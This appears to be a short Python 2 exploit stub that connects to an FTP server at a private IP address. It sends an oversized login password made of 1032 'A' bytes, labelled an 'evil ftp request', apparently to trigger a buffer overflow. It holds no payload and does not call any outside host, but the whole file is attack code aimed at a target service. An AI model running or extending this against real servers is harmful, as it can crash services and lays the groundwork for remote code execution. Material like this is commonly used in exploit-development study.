import socket
import os
import sys
from ftplib import FTP

buffer = "\x41" * 1032

print "[*] Sending evil ftp request to target"
ftp = FTP()
ftp.connect('192.168.100.118', 21)
ftp.login('anonymous', buffer)


